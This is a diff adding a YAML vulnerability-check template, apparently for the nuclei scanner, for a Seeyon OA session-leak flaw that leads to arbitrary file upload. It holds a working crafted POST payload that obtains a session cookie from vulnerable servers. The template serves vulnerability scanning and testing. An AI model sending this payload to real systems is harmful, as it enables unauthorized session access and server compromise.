@@ -1,0 +1,32 @@
+id: Seeyon-Seesion-RCE
+
+info:
+  name: Seeyon-Seesion-RCE
+  author: wintrysec
+  severity: critical
+  description: 致远OA-Seesion泄露任意文件上传
+  reference: https://github.com/DawnFlame/POChouse
+  tags: seeyon
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/seeyon/thirdpartyController.do"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Accept-Encoding: gzip, deflate
+    body: 'method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "JSESSIONID"
+      - type: word
+        part: body
+        words: 
+          - "a8genius"
+      - type: status
+        status:
+          - 200
+      
